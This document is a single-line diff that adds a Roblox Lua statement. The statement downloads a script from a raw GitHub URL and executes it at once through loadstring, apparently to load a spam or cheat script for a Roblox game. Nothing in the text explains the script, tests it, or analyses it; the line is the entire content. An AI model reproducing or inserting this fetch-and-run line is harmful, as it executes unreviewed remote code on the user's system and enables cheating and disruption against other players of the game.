@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/don-t-get-fired-at-work-spam1-jjv7zg9bkycqb4.lua"))()
